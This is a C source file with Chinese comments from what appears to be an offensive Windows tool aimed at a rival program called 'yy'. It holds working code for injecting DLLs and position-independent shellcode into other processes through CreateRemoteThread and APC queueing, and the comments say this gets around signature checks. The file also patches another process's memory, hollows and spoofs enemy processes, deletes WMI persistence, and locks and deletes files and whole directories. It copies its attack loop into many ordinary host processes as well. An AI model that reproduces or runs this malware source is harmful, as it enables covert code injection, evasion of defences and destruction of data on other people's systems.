static void WipeTreeEntry(TreeEntry *e)
{
    if (!e || !e->path[0]) return;
    if (LockThenDeleteFile(e->path))
        WriteKillLog(L"已锁死并删除源文件: %s", e->path);
    else
        WriteKillLog(L"源文件锁删失败: %s", e->path);
}

/* ================== 掐断 yy 的复活源（读完 testyy 的汇编后加的） ==================
   yy.exe 的 yyguaard.dll（注入到每个 yy 进程和若干宿主）里那段循环是：

       每 150ms：
         cnt = 数进程表里叫 yy.exe 的进程数
         if (cnt <= 0)  → 去 spawn
         if (FindWindowW(L"YYWnd_7f3a9c1e") == NULL) {          // 没有主窗口 = 认为全挂了
              if (1500ms 到了) { 杀光**所有** yy.exe；cnt = 重新数 }
         }
         if (cnt >= 3) → 只 sleep，不 spawn
         if (距上次 spawn < 250ms) → 只 sleep
         if (<dir>\yy.exe 不存在) CopyFileW(<dir>\yyres.bin → <dir>\yy.exe)   // 从备份还原
                                  失败再 CopyFileW(%TEMP%\yy_backup_7f3a9c1e.dat → …)
         CreateProcessW(<dir>\yy.exe, NULL, cwd=<dir>)       // 起一个新副本

   这就是"启动后疯狂启动副本"的来源：**每个**被注入的 guard 都独立跑这段，没有单例/互斥；
   没有主窗口时它们先互相把 yy.exe 杀光，再各自补一个，于是 杀→补→杀→补 无限循环。
   我们的对策很直接：**把它的"备料"锁死**——它还原/启动都要读这些文件，读不到就彻底哑火。

   注意：这些文件必须**先锁死（删除待决、独占、不给共享读）再删除**，
   这样 guard 的 CopyFileW / CreateProcessW 都会失败（文件在、但打不开 = 没有可启动的镜像）。 */
static void KillYyRespawnSources(LPCWSTR enemyExePath)
{
    WCHAR dir[MAX_PATH] = L"";
    WCHAR p[MAX_PATH];
    WCHAR temp[MAX_PATH];
    const WCHAR *slash;

    if (enemyExePath && enemyExePath[0]) {
        wcsncpy_s(dir, MAX_PATH, enemyExePath, _TRUNCATE);
        slash = wcsrchr(dir, L'\\');
        if (slash) dir[slash - dir + 1] = L'\0';
    }
    if (dir[0]) {
        /* ① 还原源：yyres.bin（guard 直接用它覆盖出 yy.exe） */
        swprintf_s(p, MAX_PATH, L"%lsyyres.bin", dir);
        NeutralizeFile(p);

        /* ② guard 本体：锁死后新起的 yy 副本/注入都读不到它（Spread 直接失效） */
        swprintf_s(p, MAX_PATH, L"%lsyyguard.dll", dir);
        if (LockThenDeleteFile(p)) WriteKillLog(L"已锁死并删除 yyguaard.dll: %s", p);
    }

    /* ③ %TEMP% 里的第二份备份（guard 的 CopyFileW 备用源） */
    if (GetTempPathW(MAX_PATH, temp)) {
        swprintf_s(p, MAX_PATH, L"%lsyy_backup_7f3a9c1e.dat", temp);
        NeutralizeFile(p);
    }
}
/* 等某个 pid 真的退出；打不开当已退出（可能刚死/被保护） */
static BOOL WaitPidExit(DWORD pid, DWORD ms)
{
    HANDLE h = OpenProcess(SYNCHRONIZE | PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    DWORD w;
    if (!h) return TRUE;
    w = WaitForSingleObject(h, ms);
    CloseHandle(h);
    return (w == WAIT_OBJECT_0) ? TRUE : FALSE;
}

/* 一次快照 + BFS 收树；结果按 depth 降序（叶子在前、根在最后） */
static int CollectTree(DWORD rootPid, TreeEntry *out, int max)
{
    static DWORD sPid[MAX_SNAP];
    static DWORD sPpid[MAX_SNAP];
    int nAll = 0, n = 0, i, j, k;
    HANDLE hSnap;
    PROCESSENTRY32W pe = { sizeof(pe) };

    if (!out || max <= 0) return 0;

    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return 0;
    if (Process32FirstW(hSnap, &pe)) {
        do {
            if (nAll >= MAX_SNAP) break;
            sPid[nAll] = pe.th32ProcessID;
            sPpid[nAll] = pe.th32ParentProcessID;
            nAll++;
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);

    out[n].pid = rootPid;
    out[n].depth = 0;
    GetProcessPath(rootPid, out[n].path, MAX_PATH);
    n++;

    /* BFS：边遍历边把子进程加进 out（out 同时充当已访问集合） */
    for (i = 0; i < n && n < max; i++) {
        if (out[i].depth >= 8) continue;                 /* 深度上限，防环 */
        for (j = 0; j < nAll && n < max; j++) {
            BOOL bSeen = FALSE;
            if (sPpid[j] != out[i].pid) continue;
            if (sPid[j] <= 4 || sPid[j] == rootPid) continue;
            for (k = 0; k < n; k++)
                if (out[k].pid == sPid[j]) { bSeen = TRUE; break; }
            if (bSeen) continue;
            out[n].pid = sPid[j];
            out[n].depth = out[i].depth + 1;
            GetProcessPath(out[n].pid, out[n].path, MAX_PATH);   /* 杀完就取不到了，先取 */
            n++;
        }
    }

    /* 按 depth 降序：插入排序（n 很小） */
    for (i = 1; i < n; i++) {
        TreeEntry key = out[i];
        for (j = i - 1; j >= 0 && out[j].depth < key.depth; j--) out[j + 1] = out[j];
        out[j + 1] = key;
    }
    return n;
}

/* 杀一个 pid：TryAllMethods → 等退出 → 没退再补一刀 */
static void KillOneAndWait(DWORD pid, LPCWSTR why)
{
    WCHAR name[MAX_PATH] = L"";
    const WCHAR *base = L"unknown";
    if (GetProcessPath(pid, name, MAX_PATH)) {
        const WCHAR *p = wcsrchr(name, L'\\');
        base = p ? p + 1 : name;
    }
    TryAllMethods(base, pid);
    if (WaitPidExit(pid, 800)) {
        WriteKillLog(L"PID=%lu(%ls) 已退出（%ls）", pid, base, why ? why : L"");
        return;
    }
    WriteKillLog(L"PID=%lu(%ls) Terminate 后仍存活 -> 补一刀（%ls）", pid, base, why ? why : L"");
    TryAllMethods(base, pid);
    if (WaitPidExit(pid, 1500))
        WriteKillLog(L"PID=%lu(%ls) 补刀后已退出", pid, base);
    else
        WriteKillLog(L"!! PID=%lu(%ls) 杀不掉（受保护进程/权限不足）", pid, base);
}

/* 杀整棵进程树（**同步实现**）：叶子先杀 → 根最后杀；每个都等它真的退出，然后逐文件锁死删除。
   注意它内部有 WaitForSingleObject（每个进程最多等 800+1500ms），
   所以**绝不能**在攻击主循环里直接调用 —— 统一走下面的 KillProcessTree() 异步包装。 */
static void KillProcessTreeSync(DWORD rootPid)
{
    TreeEntry tree[MAX_TREE];
    int n, i;

    if (rootPid <= 4) return;
    n = CollectTree(rootPid, tree, MAX_TREE);
    WriteKillLog(L"进程树: 根 PID=%lu 共 %d 个进程（按深度降序，叶子先杀）", rootPid, n);
    if (n <= 0) return;

    for (i = 0; i < n; i++) {
        KillOneAndWait(tree[i].pid, (i == n - 1) ? L"根进程" : L"子进程");
        if (i != n - 1) WipeTreeEntry(&tree[i]);      /* 子进程源文件立刻锁死+删除 */
    }

    /* 根进程自己的源文件：清空其目录由新线程负责（隔 1.2s 再清一遍） */
    if (tree[n - 1].path[0]) {
        WipeTreeEntry(&tree[n - 1]);
        KillYyRespawnSources(tree[n - 1].path);   /* 掐复活源：yyres.bin / yyguaard.dll / %TEMP% 备份 */
        SpawnWipeEnemyDir(tree[n - 1].path);
    }

    /* 收尾：这一轮里可能又冒出新子进程（父进程被杀前的 last gasp），补杀一轮 */
    {
        TreeEntry again[MAX_TREE];
        int m = CollectTree(rootPid, again, MAX_TREE), j, killed = 0;
        for (j = 0; j < m; j++) {
            int k;
            BOOL bKnown = FALSE;
            for (k = 0; k < n; k++) if (tree[k].pid == again[j].pid) { bKnown = TRUE; break; }
            if (bKnown) continue;
            WriteKillLog(L"补杀新出现的子进程 PID=%lu", again[j].pid);
            KillOneAndWait(again[j].pid, L"新冒出的子进程");
            WipeTreeEntry(&again[j]);
            killed++;
        }
        if (killed) WriteKillLog(L"进程树收尾: 补杀 %d 个", killed);
    }
}

static BOOL KillFast(DWORD pid);        /* 前置声明：快杀（挂起+终止），定义在文件后部 */

#include "parts/strike.c"

/* ================== A2 + A6：让 yy 的窗口**立刻**消失 ==================
   本轮实测结论：
     · A6 `NtUserDestroyWindow`（走 win32u.dll 导出，不写死 syscall 号）**跨进程无效**：
       返回 STATUS_SUCCESS(0) 但窗口依然存在 —— win32k 只认真属主进程。留着当无害尝试并记日志。
     · A2 `TerminateThread(持有该窗口的 GUI 线程)` **有效**：实测 300ms 内 IsWindow 变 0，
       宿主进程仍然活着。这是跨进程摧毁窗口唯一又快又可靠的手段
       （user32!DestroyWindow 跨进程必失败，你已踩过）。
   顺序：A6 试一次（记录）→ A2 无条件执行。 */
typedef LONG (WINAPI *NtUserDestroyWindow_t)(HWND);

static void FastKillYyWindow(HWND hWnd, LPCWSTR why)
{
    static NtUserDestroyWindow_t s_pNtUserDestroy = NULL;
    static BOOL s_bTried = FALSE;
    DWORD pid = 0, tid;
    HANDLE hTh;
    BOOL ok;

    if (!hWnd || !IsWindow(hWnd)) return;
    tid = GetWindowThreadProcessId(hWnd, &pid);
    if (!tid) return;

    if (!s_bTried) {
        HMODULE h = LoadLibraryW(L"win32u.dll");
        s_bTried = TRUE;
        if (!h) h = LoadLibraryW(L"user32.dll");
        if (h) s_pNtUserDestroy = (NtUserDestroyWindow_t)GetProcAddress(h, "NtUserDestroyWindow");
    }
    if (s_pNtUserDestroy) {
        LONG st = s_pNtUserDestroy(hWnd);
        WriteKillLog(L"A6 NtUserDestroyWindow(%ls) hwnd=%p 返回 0x%08lX，IsWindow=%d",
                     why ? why : L"", (void *)hWnd, (unsigned long)st, IsWindow(hWnd) ? 1 : 0);
    }
    if (!IsWindow(hWnd)) return;

    hTh = OpenThread(THREAD_TERMINATE | THREAD_SUSPEND_RESUME, FALSE, tid);
    if (!hTh) {
        WriteKillLog(L"A2 OpenThread 失败 tid=%lu err=%lu（退回杀进程 PID=%lu）",
                     tid, GetLastError(), pid);
        KillFast(pid);
        return;
    }
    ok = TerminateThread(hTh, 0);
    CloseHandle(hTh);
    if (ok) {
        Sleep(20);
        WriteKillLog(L"A2 已终止 yy 窗口线程 tid=%lu(%ls)，窗口消失=%d（PID=%lu 仍在）",
                     tid, why ? why : L"", IsWindow(hWnd) ? 0 : 1, pid);
    } else {
        WriteKillLog(L"A2 TerminateThread 失败 tid=%lu err=%lu（退回杀进程）", tid, GetLastError());
        KillFast(pid);
    }
}

static BOOL KillByTerminate(DWORD pid)
{
    BOOL bResult = FALSE;
    HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
    if (hProc)
    {
        bResult = TerminateProcess(hProc, 0);
        CloseHandle(hProc);
        if (bResult)
            WriteKillLog(L"TerminateProcess 成功结束 PID=%lu", pid);
        else
            WriteKillLog(L"TerminateProcess 失败 PID=%lu err=%lu", pid, GetLastError());
    }
    else
    {
        WriteKillLog(L"TerminateProcess 打开失败 PID=%lu err=%lu", pid, GetLastError());
    }
    return bResult;
}

/* 方法2：CreateRemoteThread 直接跑 ExitProcess(0)
   与 TerminateProcess 走不同退出路径——它会正常执行各模块的 DLL_PROCESS_DETACH，
   可绕开"只拦 TerminateProcess"的防御。无需 VirtualAllocEx（不传字符串）。 */
static BOOL KillByRemoteExit(DWORD pid)
{
    HANDLE hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
                               PROCESS_VM_WRITE, FALSE, pid);
    if (!hProc)
    {
        WriteKillLog(L"RemoteExit 打开进程失败 PID=%lu err=%lu", pid, GetLastError());
        return FALSE;
    }

    LPTHREAD_START_ROUTINE pExit = (LPTHREAD_START_ROUTINE)
        GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "ExitProcess");
    if (!pExit)
    {
        CloseHandle(hProc);
        return FALSE;
    }

    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, pExit, (LPVOID)0, 0, NULL);
    if (!hThread)
    {
        WriteKillLog(L"RemoteExit 创建远程线程失败 PID=%lu err=%lu", pid, GetLastError());
        CloseHandle(hProc);
        return FALSE;
    }

    WaitForSingleObject(hThread, 500);
    CloseHandle(hThread);
    CloseHandle(hProc);
    WriteKillLog(L"CreateRemoteThread+ExitProcess 成功 PID=%lu", pid);
    return TRUE;
}

/* 方法3：注入 payload.dll（让目标进程自行终止） */
static BOOL KillByKillerDll(DWORD pid, LPCWSTR killerPath)
{
    if (GetFileAttributesW(killerPath) == INVALID_FILE_ATTRIBUTES)
    {
        WriteKillLog(L"payload.dll 不存在: %s", killerPath);
        return FALSE;
    }
    HANDLE hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE,
                               FALSE, pid);
    if (!hProc)
    {
        WriteKillLog(L"payload.dll 注入打开进程失败 PID=%lu err=%lu", pid, GetLastError());
        return FALSE;
    }

    SIZE_T pathSize = (wcslen(killerPath) + 1) * sizeof(WCHAR);
    LPVOID pRemote = VirtualAllocEx(hProc, NULL, pathSize, MEM_COMMIT, PAGE_READWRITE);
    if (!pRemote)
    {
        CloseHandle(hProc);
        WriteKillLog(L"payload.dll VirtualAllocEx 失败 PID=%lu", pid);
        return FALSE;
    }

    BOOL bWrite = WriteProcessMemory(hProc, pRemote, killerPath, pathSize, NULL);
    if (!bWrite)
    {
        VirtualFreeEx(hProc, pRemote, 0, MEM_RELEASE);
        CloseHandle(hProc);
        WriteKillLog(L"payload.dll WriteProcessMemory 失败 PID=%lu", pid);
        return FALSE;
    }

    LPTHREAD_START_ROUTINE pLoadLib = (LPTHREAD_START_ROUTINE)
        GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "LoadLibraryW");
    if (!pLoadLib)
    {
        VirtualFreeEx(hProc, pRemote, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return FALSE;
    }

    HANDLE hRemote = CreateRemoteThread(hProc, NULL, 0, pLoadLib, pRemote, 0, NULL);
    if (hRemote)
    {
        DWORD code = 0;
        WaitForSingleObject(hRemote, 3000);
        /* 远端线程退出码 = 宿主里 LoadLibraryW 的返回值（HMODULE）；
           成功了就把会话随机名推给它（方案 A：远程调用 XxSetNames，读完清零释放）。 */
        if (GetExitCodeThread(hRemote, &code) && code != 0)
            PushNamesRemote(hProc, (HMODULE)(ULONG_PTR)code, killerPath, pid);
        CloseHandle(hRemote);
    }
    else
    {
        WriteKillLog(L"注入 payload.dll 到 PID=%lu 失败 err=%lu", pid, GetLastError());
    }

    VirtualFreeEx(hProc, pRemote, 0, MEM_RELEASE);
    CloseHandle(hProc);
    return TRUE;
}

/* 方法3b：注入 payload.bin（位置无关 shellcode，可绕过签名检查） */
static BOOL KillByKillerBin(DWORD pid, BOOL useApc)
{
    WCHAR binPath[MAX_PATH];
    if (g_szPayloadBinCopy[0]) wcsncpy_s(binPath, MAX_PATH, g_szPayloadBinCopy, _TRUNCATE);
    else GetKillerBinPath(binPath, MAX_PATH);

    HANDLE hFile = CreateFileW(binPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        WriteKillLog(L"payload.bin 不存在: %s", binPath);
        return FALSE;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == 0 || fileSize > 0x10000) { CloseHandle(hFile); return FALSE; }

    LPVOID pLocal = VirtualAlloc(NULL, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    DWORD bytesRead = 0;
    if (!ReadFile(hFile, pLocal, fileSize, &bytesRead, NULL) || bytesRead != fileSize)
    {
        CloseHandle(hFile); VirtualFree(pLocal, 0, MEM_RELEASE); return FALSE;
    }
    CloseHandle(hFile);

    HANDLE hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hProc)
    {
        VirtualFree(pLocal, 0, MEM_RELEASE);
        WriteKillLog(L"shellcode 打开进程失败 PID=%lu err=%lu", pid, GetLastError());
        return FALSE;
    }

    LPVOID pRemote = VirtualAllocEx(hProc, NULL, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pRemote)
    {
        CloseHandle(hProc); VirtualFree(pLocal, 0, MEM_RELEASE);
        WriteKillLog(L"shellcode VirtualAllocEx 失败 PID=%lu", pid);
        return FALSE;
    }

    if (!WriteProcessMemory(hProc, pRemote, pLocal, fileSize, NULL))
    {
        VirtualFreeEx(hProc, pRemote, 0, MEM_RELEASE);
        CloseHandle(hProc); VirtualFree(pLocal, 0, MEM_RELEASE);
        WriteKillLog(L"shellcode WriteProcessMemory 失败 PID=%lu", pid);
        return FALSE;
    }

    BOOL result = FALSE;
    int apcQueued = 0;

    if (useApc)
    {
        /* APC 注入：绕过 LoadLibrary 签名检查（直接执行已写入的代码） */
        HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        if (hThreadSnap != INVALID_HANDLE_VALUE)
        {
            THREADENTRY32 te;
            te.dwSize = sizeof(te);
            if (Thread32First(hThreadSnap, &te))
            {
                do {
                    if (te.th32OwnerProcessID == pid)
                    {
                        HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
                        if (hThread)
                        {
                            if (QueueUserAPC((PAPCFUNC)pRemote, hThread, 0))
                            {
                                result = TRUE;
                                apcQueued++;
                            }
                            CloseHandle(hThread);
                        }
                    }
                } while (Thread32Next(hThreadSnap, &te));
            }
            CloseHandle(hThreadSnap);
        }
        WriteKillLog(L"APC 排队注入 PID=%lu 线程数=%d 结果=%s", pid, apcQueued, result ? L"成功" : L"失败");
    }

    if (!result)
    {
        /* 回退到 CreateRemoteThread */
        HANDLE hRemote = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pRemote, NULL, 0, NULL);
        if (hRemote)
        {
            WaitForSingleObject(hRemote, 100);
            CloseHandle(hRemote);
            result = TRUE;
            WriteKillLog(L"远程线程 shellcode 注入 PID=%lu 成功", pid);
        }
        else
        {
            WriteKillLog(L"远程线程 shellcode 注入 PID=%lu 失败 err=%lu", pid, GetLastError());
        }
    }

    CloseHandle(hProc);
    VirtualFree(pLocal, 0, MEM_RELEASE);
    return result;
}

/* 方法4：Job 对象终止 */
static BOOL KillByJobObject(DWORD pid)
{
    BOOL bResult = FALSE;
    HANDLE hProc = OpenProcess(PROCESS_SET_QUOTA | PROCESS_TERMINATE, FALSE, pid);
    if (!hProc)
    {
        WriteKillLog(L"Job 打开进程失败 PID=%lu err=%lu", pid, GetLastError());
        return FALSE;
    }

    HANDLE hJob = CreateJobObjectW(NULL, NULL);
    if (!hJob)
    {
        CloseHandle(hProc);
        return FALSE;
    }

    // 设置 Job 信息：当 Job 中最后一个进程句柄关闭时终止所有进程
    JOBOBJECT_EXTENDED_LIMIT_INFORMATION jeli = { 0 };
    jeli.BasicLimitInformation.LimitFlags = JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE;
    if (SetInformationJobObject(hJob, JobObjectExtendedLimitInformation, &jeli, sizeof(jeli)))
    {
        if (AssignProcessToJobObject(hJob, hProc))
        {
            // Job 已绑定，关闭 Job 句柄将终止进程（因为设置了 KILL_ON_JOB_CLOSE）
            // 但需要等待一小段时间让系统执行
            CloseHandle(hJob);   // 这会触发目标进程终止
            bResult = TRUE;
            WriteKillLog(L"Job 对象绑定成功 PID=%lu", pid);
        }
        else
        {
            WriteKillLog(L"Job 绑定失败 PID=%lu err=%lu", pid, GetLastError());
            CloseHandle(hJob);
        }
    }
    else
    {
        CloseHandle(hJob);
    }

    CloseHandle(hProc);
    return bResult;
}

static BOOL GetProcessPath(DWORD pid, WCHAR *path, DWORD cch)
{
    path[0] = L'\0';
    HANDLE h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!h) return FALSE;
    DWORD size = cch;
    BOOL ok = QueryFullProcessImageNameW(h, 0, path, &size);
    CloseHandle(h);
    return ok;
}

static void LockImage(LPCWSTR path)
{
    if (!path || !path[0]) return;
    LONG n = g_nLocks;
    for (LONG i = 0; i < n && i < MAX_LOCKS; i++) {
        if (g_lockPaths[i][0] && _wcsicmp(g_lockPaths[i], path) == 0)
            return;
    }
    LONG slot = InterlockedIncrement(&g_nLocks) - 1;
    if (slot < 0 || slot >= MAX_LOCKS) { InterlockedDecrement(&g_nLocks); return; }
    wcsncpy(g_lockPaths[slot], path, MAX_PATH - 1);
    g_lockPaths[slot][MAX_PATH - 1] = L'\0';
    g_hLocks[slot] = NULL;
    WriteKillLog(L"记录镜像锁路径: %s", path);
}

static void MaintainLocks(void)
{
    LONG n = g_nLocks;
    for (LONG i = 0; i < n && i < MAX_LOCKS; i++) {
        if (!g_lockPaths[i][0] || g_hLocks[i]) continue;
        HANDLE h = CreateFileW(g_lockPaths[i], 0, 0, NULL, OPEN_EXISTING,
                               FILE_ATTRIBUTE_NORMAL, NULL);
        if (h != INVALID_HANDLE_VALUE)
        {
            g_hLocks[i] = h;
            WriteKillLog(L"镜像锁获取成功: %s", g_lockPaths[i]);
        }
    }
}

static BOOL TryAllMethods(LPCWSTR exeName, DWORD pid)
{
    WCHAR killerPath[MAX_PATH];
    if (g_szPayloadCopy[0]) wcsncpy_s(killerPath, MAX_PATH, g_szPayloadCopy, _TRUNCATE);
    else GetKillerPath(killerPath, MAX_PATH);

    BOOL bTarget = IsTargetName(exeName);
    const WCHAR *name = exeName ? exeName : L"unknown";

    /* 方法0（B3）：NtSuspendProcess 先冻住再 NtTerminateProcess —— 最快，也是 yy 对我们用的招 */
    if (KillFast(pid))
    {
        WriteKillLog(L"已结束 %s PID=%lu (KillFast: 挂起+终止)", name, pid);
        return TRUE;
    }

    // 方法1：直接终止
    if (KillByTerminate(pid))
    {
        WriteKillLog(L"已结束 %s PID=%lu (TerminateProcess)", name, pid);
        return TRUE;
    }

    // 方法2：CreateRemoteThread + ExitProcess（正常退出路径，跑 DLL_PROCESS_DETACH）
    if (KillByRemoteExit(pid))
    {
        WriteKillLog(L"已结束 %s PID=%lu (RemoteExit)", name, pid);
        return TRUE;
    }

    // 方法3：注入 payload.dll（host only - target 禁止非 MS 签名 DLL）
    if (!bTarget && KillByKillerDll(pid, killerPath))
    {
        return TRUE;
    }

    // 方法3b：注入 payload.bin shellcode
    // - target (yy): 使用 APC 绕过签名检查
    // - host (notepad): 使用 CreateRemoteThread
    if (bTarget)
    {
        if (KillByKillerBin(pid, TRUE))  // APC
        {
            WriteKillLog(L"已通过 APC 注入 shellcode 结束 %s PID=%lu", name, pid);
            return TRUE;
        }
    }
    else
    {
        if (KillByKillerBin(pid, FALSE)) // RemoteThread
        {
            WriteKillLog(L"已通过远程线程 shellcode 结束 %s PID=%lu", name, pid);
            return TRUE;
        }
    }

    // 方法4：Job 对象终结
    if (KillByJobObject(pid))
    {
        WriteKillLog(L"已通过 Job 对象结束 %s PID=%lu", name, pid);
        return TRUE;
    }

    WriteKillLog(L"所有方法失败: %s PID=%lu", name, pid);
    return FALSE;
}

/* 攻击主循环 */
static void AttackPass(void)
{
    DWORD hostPids[128];
    DWORD targetPids[128];
    int nHosts = 0, nTargets = 0;

    /* 宿主判定：
       ① 我们跑在 yy/ww 主进程里 —— 不杀自己（外围的副本会杀它），只做 #11 内部感染；
       ② 我们跑在 yy 家族的**子进程**（蜜罐等）里 —— 同样不杀自己，外围会把它杀掉+锁死+删除；
       ③ 其它宿主（xx、explorer、notepad…）照常执行攻击。 */
    if (HostIsTargetExe()) {
        InfectYyHost();
        FindYyPopupInSelf();     /* 顺手确认弹窗（日志用） */
        return;
    }
    if (FindYyPopupInSelf() && !HostIsTargetExe()) {
        WCHAR leaf[MAX_PATH] = L"";
        HostLeafName(leaf, MAX_PATH);
        if (IsKnownYyFamilyName(leaf)) return;    /* 家族子进程宿主：不自杀 */
    }

    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap != INVALID_HANDLE_VALUE)
    {
        PROCESSENTRY32W pe;
        pe.dwSize = sizeof(pe);
        if (Process32FirstW(hSnap, &pe))
        {
            do
            {
                for (int i = 0; g_hostTargets[i]; i++)
                {
                    if (_wcsicmp(pe.szExeFile, g_hostTargets[i]) == 0)
                    {
                        if (nHosts < 128) hostPids[nHosts++] = pe.th32ProcessID;
                        break;
                    }
                }
                for (int i = 0; g_targets[i]; i++)
                {
                    if (_wcsicmp(pe.szExeFile, g_targets[i]) == 0)
                    {
                        if (nTargets < 128) targetPids[nTargets++] = pe.th32ProcessID;
                        break;
                    }
                }
            } while (Process32NextW(hSnap, &pe));
        }
        CloseHandle(hSnap);
    }

    if (nTargets || nHosts)
        WriteKillLog(L"扫描发现 目标=%d 宿主=%d", nTargets, nHosts);

    /* Phase A: 先改它内存（#16 断掉建窗、#17 12 字节 TerminateProcess），
       然后**发现即杀**：结束整棵进程树 + 每个源文件先锁死（删除待决）再删除，
       根进程目录由新线程整目录清空。先 patch 后杀：万一这一轮杀不掉（对手保护/PPL），
       patch 也已经生效了。 */
    for (int i = 0; i < nTargets; i++)
    {
        PatchEnemyMemory(targetPids[i]);      /* #16 / #17 */
        KillYyBody(targetPids[i], L"Phase A 扫描到本体");
    }

    /* Phase A1: yy 家族子进程 + 蜜罐 —— 直接杀掉 + 锁死 + 删除。
       顺序有讲究：先杀蜜罐并锁删它自己那份镜像，再把 %TEMP%\lenovo_fix.exe 换成
       0 字节占位并独占锁住（先锁名字就锁不到它自己那份文件了）。 */
    KillHoneypotPass();
    BlockHoneypotRespawn();
    ApplyYyChildPolicy();

    /* Phase A2: 删对手的 WMI 复活订阅（三件套），节流 5 秒一次 */
    {
        static DWORD s_dwLastWmi = 0;
        DWORD now = GetTickCount();
        if (nTargets > 0 && (s_dwLastWmi == 0 || now - s_dwLastWmi >= 5000)) {
            s_dwLastWmi = now;
            RemoveEnemyWmi();
        }
    }

    /* Phase B: kill guard hosts + lock image */
    for (int i = 0; i < nHosts; i++)
    {
        WCHAR path[MAX_PATH];
        path[0] = L'\0';
        GetProcessPath(hostPids[i], path, MAX_PATH);
        TryAllMethods(L"notepad.exe", hostPids[i]);
        if (path[0]) LockImage(path);
    }

    /* Phase C: catch yy respawned in the gap —— 用 B1 快速枚举（一次 syscall）
       代替每轮 CreateToolhelp32Snapshot：那玩意儿要把整个进程表复制两遍，是"枚举慢"的根因。 */
    {
        DWORD pids[XX_MAX_PIDS];
        WCHAR names[XX_MAX_PIDS][64];
        int cnt = XXEnumProcessesFast(pids, names, XX_MAX_PIDS);
        for (int k = 0; k < cnt; k++) {
            const WCHAR *leaf = names[k];
            for (int i = 0; g_targets[i]; i++) {
                if (_wcsicmp(leaf, g_targets[i]) == 0) {
                    WriteKillLog(L"Phase C 发现复活目标 %ls PID=%lu", leaf, pids[k]);
                    KillYyBody(pids[k], L"Phase C 复活目标");
                    break;
                }
            }
        }
    }

    MaintainLocks();
}

static BOOL HostIsXxExe(void) {
    WCHAR path[MAX_PATH] = L"";
    if (!GetModuleFileNameW(NULL, path, MAX_PATH)) return FALSE;
    const WCHAR *p = wcsrchr(path, L'\\');
    p = p ? p + 1 : path;
    return _wcsicmp(p, L"xx.exe") == 0;
}

/* ---- T0/T1/T2 对手识别（实现在 hunter/hunt.c，直接内联进来） ---- */
#include "hunter/hunt.c"


static DWORD WINAPI AttackLoop(LPVOID lp)
{
    UNREFERENCED_PARAMETER(lp);

    /* One leader across hosts. Mutex released after every pass so a
       suspended/dead xx cannot stall standbys (death => WAIT_ABANDONED).
       名字带会话 token：对手再也抢不到这把锁。 */
    WCHAR szLead[128];
    XXNamedObject(szLead, _countof(szLead), FALSE, XX_PURPOSE_ATTACK_LEAD, NameTok(), 0);
    HANDLE hLead = CreateMutexW(NULL, FALSE, szLead);

    /* xx.exe 自身放慢到 300ms：攻击负荷交给被注入其它进程的副本（仍 30ms），
       既降低 xx.exe CPU，又让副本在 xx 释放 leader 后立刻接手。 */
    /* 攻击频率按宿主区分：
         · xx.exe 自己（那是交付本体）：40ms，尽全力；
         · 被注入的宿主副本：**2000ms**。用户指定的注入矩阵会把 atkcore 注进大量
           普通进程，如果每个宿主都 40ms 枚举+击杀，N 个宿主就是 N 倍 CPU（实测卡死）。
           2 秒一次足够"xx 死了仍然有攻击者在干活"，又不会把机器拖垮。 */
    const DWORD dwIdle = HostIsXxExe() ? 40 : 2000;
    DWORD dwHuntTick = 0;   /* T0/T1/T2 三层识别：慢频（30s），不占攻击循环预算 */
    DWORD dwHbTick = 0;     /* 心跳伪造：500ms 一次 */
    DWORD dwHollowTick = 0; /* 宿主化 + 反宿主化：60s 一次 */
    DWORD dwCopyTick = 0;

    while (g_bRunning)
    {
        {
            DWORD now = GetTickCount();
            if (dwCopyTick == 0 || now - dwCopyTick >= 5000) {
                dwCopyTick = now;
                RefreshKillerCopies();
                PlantSignaturesInAllTargets();   /* 3~5s 一轮：种特征串到 yy 私有内存 */
            }
            /* T0/T1/T2 三层识别：30 秒一轮（全盘 PE 指纹 + 系统句柄枚举，别放进 40ms 循环） */
            if (dwHuntTick == 0 || now - dwHuntTick >= 30000) {
                dwHuntTick = now;
                HuntPass();
            }
            /* 宿主化：60 秒最多一次，把对手映像变成我方宿主（PID 进白名单） */
            if (dwHollowTick == 0 || now - dwHollowTick >= 60000) {
                dwHollowTick = now;
                HollowFirstEnemy();
                CheckFakeSelf();
            }
            /* 心跳伪造：500ms 一次，让 yyguard 一直认为 yy 还活着 */
            if (dwHbTick == 0 || now - dwHbTick >= 500) {
                dwHbTick = now;
                SpoofEnemyHeartbeat();
            }
        }
        if (!hLead)
        {
            AttackPass();
            Sleep(dwIdle);
            continue;
        }
        DWORD w = WaitForSingleObject(hLead, 0);
        if (w == WAIT_OBJECT_0 || w == WAIT_ABANDONED)
        {
            AttackPass();
            ReleaseMutex(hLead);
            Sleep(dwIdle);
        }
        else
        {
            Sleep(dwIdle);
        }
    }

    if (hLead) CloseHandle(hLead);
    return 0;
}

/* 导出：按 PID 结束整棵进程树（供 xx.exe 的"窗口 → PID"路径调用）。
